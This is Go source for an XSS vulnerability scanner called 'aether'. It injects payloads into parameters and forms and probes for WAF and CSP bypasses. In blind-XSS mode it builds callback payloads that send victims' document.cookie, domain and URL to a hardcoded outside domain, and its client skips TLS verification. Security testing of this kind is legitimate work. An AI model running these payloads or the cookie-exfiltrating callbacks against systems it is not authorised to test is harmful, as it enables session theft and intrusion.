package scanner

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/ibrahimsql/aether/modules/config"
	"github.com/ibrahimsql/aether/modules/payloads"
	"github.com/ibrahimsql/aether/modules/utils"
)

// Scanner represents the XSS scanner
type Scanner struct {
	config            *config.Config
	client            *http.Client
	stats             *Stats
	cache             map[string]*http.Response // Response cache for optimization
	wafDetected       bool                      // WAF detection flag
	detectedWAF       string                    // Detected WAF name
	payloadMap        map[string][]string       // Map of context-specific payloads
	headlessClient    *HeadlessClient           // Headless browser client for DOM XSS testing
	blindXSSCallbacks []string                  // Blind XSS callback URLs
	harEntries        []HAREntry                // HAR entries for logging
	mu                sync.Mutex                // Mutex for thread-safe operations
}

// Stats represents the scanner statistics
type Stats struct {
	TestedURLs       int
	VulnerableURLs   int
	FailedRequests   int
	ParametersFound  int
	PayloadsTested   int
	WAFBypassed      int
	DOMXSSFound      int
	BlindXSSFound    int
	CSPBypassed      int
	TotalRequestTime int64 // Toplam istek süresi (milisaniye)
	StartTime        time.Time
	EndTime          time.Time
	mu               sync.Mutex
}

// Result represents the scan result
type Result struct {
	Target          string          `json:"target"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	StartTime       string          `json:"start_time"`
	EndTime         string          `json:"end_time"`
	Duration        string          `json:"duration"`
	Stats           *Stats          `json:"stats"`
	WAFDetected     bool            `json:"waf_detected"`
	DetectedWAF     string          `json:"detected_waf,omitempty"`
	CSPInfo         *CSPInfo        `json:"csp_info,omitempty"`
	CrawledURLs     []string        `json:"crawled_urls,omitempty"`
}

// Vulnerability represents a detected vulnerability
type Vulnerability struct {
	Type        string `json:"type"`
	URL         string `json:"url"`
	Parameter   string `json:"parameter"`
	Evidence    string `json:"evidence"`
	Severity    string `json:"severity"`
	Confidence  string `json:"confidence"`
	Payload     string `json:"payload"`
	Context     string `json:"context,omitempty"`
	Vector      string `json:"vector,omitempty"`
	WAFBypassed bool   `json:"waf_bypassed,omitempty"`
	Exploitable bool   `json:"exploitable,omitempty"`
}

// CSPInfo represents Content Security Policy information
type CSPInfo struct {
	Header       string            `json:"header,omitempty"`
	Directives   map[string]string `json:"directives,omitempty"`
	Vulnerable   bool              `json:"vulnerable"`
	Bypassable   bool              `json:"bypassable"`
	BypassVector string            `json:"bypass_vector,omitempty"`
}

// HeadlessClient represents a headless browser client for DOM XSS testing
type HeadlessClient struct {
	ctx    context.Context
	cancel context.CancelFunc
}

// HAREntry represents an HTTP Archive entry
type HAREntry struct {
	StartedDateTime string            `json:"startedDateTime"`
	Time            int               `json:"time"`
	Request         HARRequest        `json:"request"`
	Response        HARResponse       `json:"response"`
	Cache           map[string]string `json:"cache"`
	Timings         map[string]int    `json:"timings"`
}

// HARRequest represents an HTTP request in HAR format
type HARRequest struct {
	Method      string              `json:"method"`
	URL         string              `json:"url"`
	HTTPVersion string              `json:"httpVersion"`
	Cookies     []HARCookie         `json:"cookies"`
	Headers     []HARHeader         `json:"headers"`
	QueryString []HARQueryParameter `json:"queryString"`
	PostData    *HARPostData        `json:"postData,omitempty"`
	HeaderSize  int                 `json:"headerSize"`
	BodySize    int                 `json:"bodySize"`
}

// HARResponse represents an HTTP response in HAR format
type HARResponse struct {
	Status      int         `json:"status"`
	StatusText  string      `json:"statusText"`
	HTTPVersion string      `json:"httpVersion"`
	Cookies     []HARCookie `json:"cookies"`
	Headers     []HARHeader `json:"headers"`
	Content     HARContent  `json:"content"`
	RedirectURL string      `json:"redirectURL"`
	HeaderSize  int         `json:"headerSize"`
	BodySize    int         `json:"bodySize"`
}

// HARCookie represents a cookie in HAR format
type HARCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path,omitempty"`
	Domain   string `json:"domain,omitempty"`
	Expires  string `json:"expires,omitempty"`
	HTTPOnly bool   `json:"httpOnly,omitempty"`
	Secure   bool   `json:"secure,omitempty"`
}

// HARHeader represents an HTTP header in HAR format
type HARHeader struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

// HARQueryParameter represents a query parameter in HAR format
type HARQueryParameter struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

// HARPostData represents POST data in HAR format
type HARPostData struct {
	MimeType string         `json:"mimeType"`
	Params   []HARPostParam `json:"params"`
	Text     string         `json:"text"`
}

// HARPostParam represents a POST parameter in HAR format
type HARPostParam struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

// HARContent represents response content in HAR format
type HARContent struct {
	Size        int    `json:"size"`
	Compression int    `json:"compression,omitempty"`
	MimeType    string `json:"mimeType"`
	Text        string `json:"text,omitempty"`
	Encoding    string `json:"encoding,omitempty"`
}

// NewScanner creates a new scanner instance
func NewScanner(cfg *config.Config) *Scanner {
	// Create HTTP client
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // Skip TLS verification for testing
		DisableKeepAlives:   false,
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
	}

	client := &http.Client{
		Timeout:   time.Duration(cfg.Timeout) * time.Second,
		Transport: transport,
	}

	// Set redirect policy
	if !cfg.FollowRedirects {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	// Set proxy if configured
	if cfg.Proxy != "" {
		proxyURL, err := url.Parse(cfg.Proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	// Initialize payload map
	payloadMap := make(map[string][]string)
	payloadMap["html"] = payloads.HTMLContextPayloads
	payloadMap["attr"] = payloads.AttributeContextPayloads
	payloadMap["js"] = payloads.JavaScriptContextPayloads
	payloadMap["url"] = payloads.URLContextPayloads
	payloadMap["css"] = payloads.CSSContextPayloads
	payloadMap["angular"] = payloads.AngularPayloads
	payloadMap["react"] = payloads.ReactPayloads
	payloadMap["vue"] = payloads.VuePayloads
	payloadMap["dom"] = payloads.DOMXSSPayloads

	// Initialize headless browser client if DOM XSS testing is enabled
	var headlessClient *HeadlessClient
	if cfg.DOMXSS {
		ctx, cancel := chromedp.NewContext(
			context.Background(),
			chromedp.WithLogf(func(format string, args ...interface{}) {
				if cfg.Verbose {
					fmt.Printf("[Headless] "+format+"\n", args...)
				}
			}),
		)

		// Set timeout for browser operations
		ctx, cancel = context.WithTimeout(ctx, time.Duration(cfg.Timeout)*time.Second)

		headlessClient = &HeadlessClient{
			ctx:    ctx,
			cancel: cancel,
		}
	}

	// Initialize blind XSS callbacks if enabled
	var blindXSSCallbacks []string
	if cfg.BlindXSS {
		// Default callback domain - should be configurable
		callbackDomain := "xss.ibrahimsql.com"

		// Generate blind XSS payloads with callbacks
		blindXSSCallbacks = []string{
			fmt.Sprintf("//%s/blind?d=${document.domain}&c=${document.cookie}", callbackDomain),
			fmt.Sprintf("//%s/blind?l=${location.href}", callbackDomain),
			fmt.Sprintf("//%s/blind?id=%s", callbackDomain, utils.GenerateRandomString(8)),
		}

		// Add custom callback if provided
		if cfg.BlindXSSCallback != "" {
			blindXSSCallbacks = append(blindXSSCallbacks, cfg.BlindXSSCallback)
		}
	}

	return &Scanner{
		config: cfg,
		client: client,
		stats: &Stats{
			StartTime: time.Now(),
		},
		cache:             make(map[string]*http.Response),
		payloadMap:        payloadMap,
		headlessClient:    headlessClient,
		blindXSSCallbacks: blindXSSCallbacks,
		harEntries:        []HAREntry{},
	}
}

// ScanURL scans a single URL for XSS vulnerabilities
func (s *Scanner) ScanURL(targetURL string) *Result {
	s.printInfo(fmt.Sprintf("Scanning URL: %s", targetURL))

	// Create result
	result := &Result{
		Target:          targetURL,
		Vulnerabilities: []Vulnerability{},
		StartTime:       s.stats.StartTime.Format(time.RFC3339),
		CrawledURLs:     []string{},
	}

	// Validate URL
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	// Check for WAF
	s.detectWAF(targetURL)
	result.WAFDetected = s.wafDetected
	result.DetectedWAF = s.detectedWAF

	if s.wafDetected {
		s.printInfo(fmt.Sprintf("WAF detected: %s", s.detectedWAF))
	}

	// Check for CSP
	if s.config.CSPAnalysis {
		s.printInfo("Analyzing Content Security Policy...")
		result.CSPInfo = s.analyzeCSP(targetURL)
		if result.CSPInfo.Vulnerable {
			s.printInfo("Vulnerable CSP detected, attempting bypass...")
		}
	}

	// Crawl website if enabled
	var crawledURLs []string
	if s.config.Crawl {
		s.printInfo("Crawling website for additional URLs...")
		crawledURLs = s.crawlWebsite(targetURL, s.config.CrawlDepth)
		result.CrawledURLs = crawledURLs
		s.printInfo(fmt.Sprintf("Found %d URLs during crawling", len(crawledURLs)))
	}

	// Parameter mining if enabled
	var params []string
	if s.config.ParamMining {
		s.printInfo("Parameter mining enabled, discovering parameters...")
		params = s.mineParameters(targetURL)

		// Also try DOM-based parameter mining if enabled
		if s.config.DOMXSS {
			domParams := s.mineDOMParameters(targetURL)
			for _, p := range domParams {
				if !utils.Contains(params, p) {
					params = append(params, p)
				}
			}
		}

		s.printInfo(fmt.Sprintf("Found %d parameters", len(params)))
	} else {
		// Use default parameters
		params = []string{"id", "name", "q", "search", "query", "page", "keywords", "url", "view", "cat", "p", "callback", "jsonp", "api_key", "api", "password", "email", "reference", "return_url", "returnUrl", "return_path", "returnpath", "path", "html", "data", "param", "src", "dest", "redirect", "uri", "source", "target", "content", "domain"}
	}

	// Create a channel for vulnerabilities
	vulnChan := make(chan Vulnerability, 100)

	// Create a wait group for goroutines
	var wg sync.WaitGroup

	// Create a semaphore to limit concurrent goroutines
	sem := make(chan struct{}, s.config.Threads)

	// Test each parameter
	for _, param := range params {
		// Add to wait group
		wg.Add(1)

		// Acquire semaphore
		sem <- struct{}{}

		// Test parameter in a goroutine
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()

			// Test parameter
			s.testParameter(targetURL, p, vulnChan)

			// Add delay if configured
			if s.config.Delay > 0 {
				time.Sleep(time.Duration(s.config.Delay) * time.Millisecond)
			}
		}(param)
	}

	// Test DOM XSS if enabled
	if s.config.DOMXSS && s.headlessClient != nil {
		s.printInfo("Testing for DOM XSS vulnerabilities...")
		wg.Add(1)
		go func() {
			defer wg.Done()
			// Test DOM XSS with common parameters
			for _, param := range []string{"id", "search", "q", "query"} {
				s.testDOMXSS(targetURL, param, vulnChan)
			}
		}()
	}

	// Test crawled URLs if available
	if len(crawledURLs) > 0 {
		s.printInfo("Testing crawled URLs...")

		for _, crawledURL := range crawledURLs {
			// Parse URL to get query parameters
			parsedURL, err := url.Parse(crawledURL)
			if err != nil {
				continue
			}

			// Get query parameters
			query := parsedURL.Query()

			// Test each parameter
			for param := range query {
				// Add to wait group
				wg.Add(1)

				// Acquire semaphore
				sem <- struct{}{}

				// Test parameter in a goroutine
				go func(url, p string) {
					defer wg.Done()
					defer func() { <-sem }()

					// Test parameter
					s.testParameter(url, p, vulnChan)

					// Add delay if configured
					if s.config.Delay > 0 {
						time.Sleep(time.Duration(s.config.Delay) * time.Millisecond)
					}
				}(crawledURL, param)
			}
		}
	}

	// Close vulnerability channel when all goroutines are done
	go func() {
		wg.Wait()
		close(vulnChan)
	}()

	// Collect vulnerabilities from channel
	for vuln := range vulnChan {
		result.Vulnerabilities = append(result.Vulnerabilities, vuln)
	}

	// Set end time
	s.stats.EndTime = time.Now()
	result.EndTime = s.stats.EndTime.Format(time.RFC3339)
	result.Duration = s.stats.EndTime.Sub(s.stats.StartTime).String()

	// Set stats
	result.Stats = s.stats

	// Generate HAR file if configured
	if s.config.HARPath != "" {
		s.generateHAR(s.config.HARPath)
	}

	return result
}

// ScanFile scans URLs from a file
func (s *Scanner) ScanFile(filePath string) *Result {
	s.printInfo(fmt.Sprintf("Scanning URLs from file: %s", filePath))

	// Create result
	result := &Result{
		Target:          filePath,
		Vulnerabilities: []Vulnerability{},
		StartTime:       s.stats.StartTime.Format(time.RFC3339),
	}

	// Open file
	file, err := os.Open(filePath)
	if err != nil {
		s.printError(fmt.Sprintf("Error opening file: %v", err))
		return result
	}
	defer file.Close()

	// Create a wait group for goroutines
	var wg sync.WaitGroup

	// Create a channel for results
	vulnChan := make(chan Vulnerability, 100)

	// Create a semaphore for limiting concurrent goroutines
	sem := make(chan struct{}, s.config.Threads)

	// Read URLs from file
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url == "" || strings.HasPrefix(url, "#") {
			continue
		}

		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore

			// Scan URL
			res := s.ScanURL(u)

			// Add vulnerabilities to channel
			for _, vuln := range res.Vulnerabilities {
				vulnChan <- vuln
			}
		}(url)
	}

	// Create a goroutine to collect results
	go func() {
		for vuln := range vulnChan {
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}()

	// Wait for all goroutines to finish
	wg.Wait()
	close(vulnChan)

	// Set end time
	s.stats.EndTime = time.Now()
	result.EndTime = s.stats.EndTime.Format(time.RFC3339)
	result.Duration = s.stats.EndTime.Sub(s.stats.StartTime).String()

	// Set stats
	result.Stats = s.stats

	return result
}

// ScanPipe scans URLs from stdin
func (s *Scanner) ScanPipe() *Result {
	s.printInfo("Scanning URLs from stdin")

	// Create result
	result := &Result{
		Target:          "stdin",
		Vulnerabilities: []Vulnerability{},
		StartTime:       s.stats.StartTime.Format(time.RFC3339),
	}

	// Create a wait group for goroutines
	var wg sync.WaitGroup

	// Create a channel for results
	vulnChan := make(chan Vulnerability, 100)

	// Create a semaphore for limiting concurrent goroutines
	sem := make(chan struct{}, s.config.Threads)

	// Read URLs from stdin
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url == "" || strings.HasPrefix(url, "#") {
			continue
		}

		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore

			// Scan URL
			res := s.ScanURL(u)

			// Add vulnerabilities to channel
			for _, vuln := range res.Vulnerabilities {
				vulnChan <- vuln
			}
		}(url)
	}

	// Create a goroutine to collect results
	go func() {
		for vuln := range vulnChan {
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}()

	// Wait for all goroutines to finish
	wg.Wait()
	close(vulnChan)

	// Set end time
	s.stats.EndTime = time.Now()
	result.EndTime = s.stats.EndTime.Format(time.RFC3339)
	result.Duration = s.stats.EndTime.Sub(s.stats.StartTime).String()

	// Set stats
	result.Stats = s.stats

	return result
}

// ScanStoredXSS scans for stored XSS vulnerabilities
func (s *Scanner) ScanStoredXSS(targetURL, formURL, resultURL string) *Result {
	s.printInfo(fmt.Sprintf("Scanning for stored XSS: %s", targetURL))

	// Create result
	result := &Result{
		Target:          targetURL,
		Vulnerabilities: []Vulnerability{},
		StartTime:       s.stats.StartTime.Format(time.RFC3339),
	}

	// Get payloads
	var xssPayloads []string
	if s.config.CustomPayload != "" {
		// Load custom payloads
		customPayloads, err := utils.LoadPayloadsFromFile(s.config.CustomPayload)
		if err != nil {
			s.printError(fmt.Sprintf("Error loading custom payloads: %v", err))
		} else {
			xssPayloads = customPayloads
		}
	} else {
		// Use default payloads
		xssPayloads = payloads.XSSPayloads
	}

	// Create a wait group for goroutines
	var wg sync.WaitGroup

	// Create a channel for results
	vulnChan := make(chan Vulnerability, 100)

	// Create a semaphore for limiting concurrent goroutines
	sem := make(chan struct{}, s.config.Threads)

	// Test each payload
	for _, payload := range xssPayloads {
		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore

		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore

			// Test stored XSS
			s.testStoredXSS(formURL, resultURL, p, vulnChan)

			// Delay if configured
			if s.config.Delay > 0 {
				time.Sleep(time.Duration(s.config.Delay) * time.Millisecond)
			}
		}(payload)
	}

	// Create a goroutine to collect results
	go func() {
		for vuln := range vulnChan {
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}()

	// Wait for all goroutines to finish
	wg.Wait()
	close(vulnChan)

	// Set end time
	s.stats.EndTime = time.Now()
	result.EndTime = s.stats.EndTime.Format(time.RFC3339)
	result.Duration = s.stats.EndTime.Sub(s.stats.StartTime).String()

	// Set stats
	result.Stats = s.stats

	return result
}

// ScanMCP scans for Multi-Context Payload vulnerabilities
func (s *Scanner) ScanMCP(targetURL, payload, contexts string) *Result {
	s.printInfo(fmt.Sprintf("Scanning for MCP: %s", targetURL))

	// Create result
	result := &Result{
		Target:          targetURL,
		Vulnerabilities: []Vulnerability{},
		StartTime:       s.stats.StartTime.Format(time.RFC3339),
	}

	// Get contexts
	contextsList := s.config.GetMCPContextsList()

	// Create a wait group for goroutines
	var wg sync.WaitGroup

	// Create a channel for results
	vulnChan := make(chan Vulnerability, 100)

	// Create a semaphore for limiting concurrent goroutines
	sem := make(chan struct{}, s.config.Threads)

	// Test each context
	for _, context := range contextsList {
		wg.Add(1)
		sem <- struct{}{} // Acquire semaphore

		go func(ctx string) {
			defer wg.Done()
			defer func() { <-sem }() // Release semaphore

			// Test MCP
			s.testMCP(targetURL, payload, ctx, vulnChan)

			// Delay if configured
			if s.config.Delay > 0 {
				time.Sleep(time.Duration(s.config.Delay) * time.Millisecond)
			}
		}(context)
	}

	// Create a goroutine to collect results
	go func() {
		for vuln := range vulnChan {
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}()

	// Wait for all goroutines to finish
	wg.Wait()
	close(vulnChan)

	// Set end time
	s.stats.EndTime = time.Now()
	result.EndTime = s.stats.EndTime.Format(time.RFC3339)
	result.Duration = s.stats.EndTime.Sub(s.stats.StartTime).String()

	// Set stats
	result.Stats = s.stats

	return result
}

// testParameter tests a parameter for XSS vulnerabilities
func (s *Scanner) testParameter(targetURL, param string, vulnChan chan<- Vulnerability) {
	// Get payloads
	var xssPayloads []string
	if s.config.CustomPayload != "" {
		// Load custom payloads
		customPayloads, err := utils.LoadPayloadsFromFile(s.config.CustomPayload)
		if err != nil {
			s.printError(fmt.Sprintf("Error loading custom payloads: %v", err))
		} else {
			xssPayloads = customPayloads
		}
	} else {
		// Use default payloads
		xssPayloads = payloads.XSSPayloads
	}

	// Test each payload
	for _, payload := range xssPayloads {
		// Encode payload
		encodedPayload := url.QueryEscape(payload)

		// Construct test URL
		testURL := s.constructURL(targetURL, param, encodedPayload)

		// Send request
		resp, err := s.sendRequest("GET", testURL, "")
		if err != nil {
			s.incrementStat("FailedRequests")
			s.printVerbose(fmt.Sprintf("Error testing %s: %v", testURL, err))
			continue
		}

		// Increment stats
		s.incrementStat("TestedURLs")
		s.incrementStat("ParametersFound")

		// Check response
		if resp != nil {
			body, err := utils.ReadResponseBody(resp)
			if err != nil {
				s.printVerbose(fmt.Sprintf("Error reading response body: %v", err))
				continue
			}

			// Check for XSS
			if utils.IsXSSVulnerable(body, payload) {
				// Found XSS vulnerability
				vuln := Vulnerability{
					Type:       "XSS",
					URL:        testURL,
					Parameter:  param,
					Evidence:   fmt.Sprintf("Payload '%s' was reflected in the response", payload),
					Severity:   "High",
					Confidence: "High",
				}

				// Send to channel
				vulnChan <- vuln

				// Increment stat
				s.incrementStat("VulnerableURLs")

				// Print info
				s.printInfo(fmt.Sprintf("Found XSS vulnerability: %s", testURL))
			}

			// Check for DOM XSS if enabled
			if s.config.DOMXSS {
				if utils.IsDOMXSSVulnerable(body, payload) {
					// Found DOM XSS vulnerability
					vuln := Vulnerability{
						Type:       "DOM XSS",
						URL:        testURL,
						Parameter:  param,
						Evidence:   fmt.Sprintf("Payload '%s' was found in DOM sources/sinks", payload),
						Severity:   "High",
						Confidence: "Medium",
					}

					// Send to channel
					vulnChan <- vuln

					// Increment stat
					s.incrementStat("VulnerableURLs")

					// Print info
					s.printInfo(fmt.Sprintf("Found DOM XSS vulnerability: %s", testURL))
				}
			}
		}

		// Delay if configured
		if s.config.Delay > 0 {
			time.Sleep(time.Duration(s.config.Delay) * time.Millisecond)
		}
	}
}

// testStoredXSS tests for stored XSS vulnerabilities
func (s *Scanner) testStoredXSS(formURL, resultURL, payload string, vulnChan chan<- Vulnerability) {
	// Generate a unique identifier for this test
	testID := utils.GenerateRandomString(8)
	markedPayload := fmt.Sprintf("aether-%s-%s", testID, payload)

	// Submit the payload to the form
	formData := fmt.Sprintf("comment=%s", url.QueryEscape(markedPayload))
	_, err := s.sendRequest("POST", formURL, formData)
	if err != nil {
		s.incrementStat("FailedRequests")
		s.printVerbose(fmt.Sprintf("Error submitting form: %v", err))
		return
	}

	// Check the result page
	resp, err := s.sendRequest("GET", resultURL, "")
	if err != nil {
		s.incrementStat("FailedRequests")
		s.printVerbose(fmt.Sprintf("Error checking result page: %v", err))
		return
	}

	// Check response
	if resp != nil {
		body, err := utils.ReadResponseBody(resp)
		if err != nil {
			s.printVerbose(fmt.Sprintf("Error reading response body: %v", err))
			return
		}

		// Check for stored XSS
		if strings.Contains(body, markedPayload) || utils.IsXSSVulnerable(body, markedPayload) {
			// Found stored XSS vulnerability
			vuln := Vulnerability{
				Type:       "Stored XSS",
				URL:        fmt.Sprintf("%s -> %s", formURL, resultURL),
				Parameter:  "comment",
				Evidence:   fmt.Sprintf("Payload '%s' was stored and reflected", payload),
				Severity:   "High",
				Confidence: "High",
			}

			// Send to channel
			vulnChan <- vuln

			// Increment stat
			s.incrementStat("VulnerableURLs")

			// Print info
			s.printInfo(fmt.Sprintf("Found Stored XSS vulnerability: %s -> %s", formURL, resultURL))
		}
	}
}

// testMCP tests for Multi-Context Payload vulnerabilities
func (s *Scanner) testMCP(targetURL, payload, context string, vulnChan chan<- Vulnerability) {
	// Get context-specific payload
	contextPayload := payload
	if payload == "" {
		// Use default payload for the context
		switch context {
		case "html":
			contextPayload = "<script>alert(1)</script>"
		case "attr":
			contextPayload = "\" onmouseover=\"alert(1)"
		case "js":
			contextPayload = "';alert(1);//"
		case "url":
			contextPayload = "javascript:alert(1)"
		case "css":
			contextPayload = "expression(alert(1))"
		default:
			contextPayload = "<script>alert(1)</script>"
		}
	}

	// Encode payload
	encodedPayload := url.QueryEscape(contextPayload)

	// Construct test URL
	testURL := s.constructURL(targetURL, "mcp", encodedPayload)

	// Send request
	resp, err := s.sendRequest("GET", testURL, "")
	if err != nil {
		s.incrementStat("FailedRequests")
		s.printVerbose(fmt.Sprintf("Error testing %s: %v", testURL, err))
		return
	}

	// Check response
	if resp != nil {
		body, err := utils.ReadResponseBody(resp)
		if err != nil {
			s.printVerbose(fmt.Sprintf("Error reading response body: %v", err))
			return
		}

		// Check for XSS in the specific context
		if utils.IsXSSVulnerableInContext(body, contextPayload, context) {
			// Found XSS vulnerability
			vuln := Vulnerability{
				Type:       fmt.Sprintf("XSS (%s context)", context),
				URL:        testURL,
				Parameter:  "mcp",
				Evidence:   fmt.Sprintf("Payload '%s' was reflected in %s context", contextPayload, context),
				Severity:   "High",
				Confidence: "High",
			}

			// Send to channel
			vulnChan <- vuln

			// Increment stat
			s.incrementStat("VulnerableURLs")

			// Print info
			s.printInfo(fmt.Sprintf("Found XSS vulnerability in %s context: %s", context, testURL))
		}
	}
}

// mineParameters mines parameters from the target URL
func (s *Scanner) mineParameters(targetURL string) []string {
	// Use a map for deduplication
	paramsMap := make(map[string]bool)

	// Add default parameters
	for _, param := range payloads.CommonParameters {
		paramsMap[param] = true
	}

	// Try to extract parameters from the URL
	parsedURL, err := url.Parse(targetURL)
	if err == nil {
		query := parsedURL.Query()
		for param := range query {
			paramsMap[param] = true
		}
	}

	// If custom wordlist is provided, use it
	if s.config.CustomPayload != "" {
		wordlist, err := utils.ReadLines(s.config.CustomPayload)
		if err == nil {
			for _, word := range wordlist {
				paramsMap[word] = true
			}
		}
	}

	// Try to guess parameters from the page content
	// Get response
	resp, err := s.sendRequest("GET", targetURL, "")
	if err != nil {
		s.printVerbose(fmt.Sprintf("Error getting %s: %v", targetURL, err))
		return []string{}
	}

	// Check response
	if resp != nil {
		body, err := utils.ReadResponseBody(resp)
		if err != nil {
			s.printVerbose(fmt.Sprintf("Error reading response body: %v", err))
			return []string{}
		}

		// Extract parameters from forms
		formParams := utils.ExtractFormParameters(body)
		for _, param := range formParams {
			paramsMap[param] = true
		}

		// Extract parameters from URLs
		urlParams := utils.ExtractURLParameters(body)
		for _, param := range urlParams {
			paramsMap[param] = true
		}

		// Extract parameters from JavaScript
		jsParams := utils.ExtractJSParameters(body)
		for _, param := range jsParams {
			paramsMap[param] = true
		}
	}

	// Convert map keys to slice
	result := []string{}
	for paramName := range paramsMap {
		result = append(result, paramName)
	}
	return result
}

// constructURL constructs a URL with a parameter and payload
func (s *Scanner) constructURL(baseURL, param, payload string) string {
	// Check if URL already has parameters
	if strings.Contains(baseURL, "?") {
		return fmt.Sprintf("%s&%s=%s", baseURL, param, payload)
	}
	return fmt.Sprintf("%s?%s=%s", baseURL, param, payload)
}

// sendRequest sends an HTTP request
func (s *Scanner) sendRequest(method, url, body string) (*http.Response, error) {
	// Create request
	req, err := http.NewRequest(method, url, strings.NewReader(body))
	if err != nil {
		return nil, err
	}

	// Set headers
	if method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	// Set custom headers
	for key, value := range s.config.GetHeadersMap() {
		req.Header.Set(key, value)
	}

	// Set cookies
	for key, value := range s.config.GetCookiesMap() {
		req.AddCookie(&http.Cookie{
			Name:  key,
			Value: value,
		})
	}

	// Set user agent if not already set
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", utils.GetRandomUserAgent())
	}

	// Send request
	return s.client.Do(req)
}

// incrementStat increments a stat
func (s *Scanner) incrementStat(name string) {
	s.stats.mu.Lock()
	defer s.stats.mu.Unlock()

	switch name {
	case "TestedURLs":
		s.stats.TestedURLs++
	case "VulnerableURLs":
		s.stats.VulnerableURLs++
	case "FailedRequests":
		s.stats.FailedRequests++
	case "ParametersFound":
		s.stats.ParametersFound++
	}
}

// incrementStatValue increments a stat with a specific value
func (s *Scanner) incrementStatValue(name string, value int64) {
	s.stats.mu.Lock()
	defer s.stats.mu.Unlock()

	switch name {
	case "TotalRequestTime":
		s.stats.TotalRequestTime += value
	}
}

// printInfo prints info message
func (s *Scanner) printInfo(message string) {
	if !s.config.Silent {
		fmt.Println(message)
	}
}

// printVerbose prints verbose message
func (s *Scanner) printVerbose(message string) {
	if s.config.Verbose && !s.config.Silent {
		fmt.Println(message)
	}
}

// printError prints error message
func (s *Scanner) printError(message string) {
	if !s.config.Silent {
		fmt.Println("ERROR:", message)
	}
}

// ToJSON converts the result to JSON
func (r *Result) ToJSON() string {
	// Convert to JSON
	json, err := utils.ToJSON(r)
	if err != nil {
		return fmt.Sprintf(`{"error": "%v"}`, err)
	}

	return json
}

// HARCreator represents the creator of the HAR file
type HARCreator struct {
	Name    string `json:"name"`
	Version string `json:"version"`
}

// HARLog represents the log section of the HAR file
type HARLog struct {
	Version string     `json:"version"`
	Creator HARCreator `json:"creator"`
	Entries []HAREntry `json:"entries"`
}

// HAR represents the HAR file structure
type HAR struct {
	Log HARLog `json:"log"`
}

// printSuccess prints success message
func (s *Scanner) printSuccess(message string) {
	if !s.config.Silent {
		fmt.Println("SUCCESS:", message)
	}
}

// generateHAR generates a HAR file with all the HTTP requests and responses
func (s *Scanner) generateHAR(filePath string) error {
	s.printInfo(fmt.Sprintf("Generating HAR file: %s", filePath))

	// Create HAR structure
	har := HAR{
		Log: HARLog{
			Version: "1.2",
			Creator: HARCreator{
				Name:    "aether",
				Version: "1.0.0",
			},
			Entries: s.harEntries,
		},
	}

	// Create file
	file, err := os.Create(filePath)
	if err != nil {
		s.printError(fmt.Sprintf("Failed to create HAR file: %v", err))
		return err
	}
	defer file.Close()

	// Write HAR data
	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(har); err != nil {
		s.printError(fmt.Sprintf("Failed to write HAR file: %v", err))
		return err
	}

	s.printSuccess(fmt.Sprintf("HAR file generated: %s", filePath))
	return nil
}
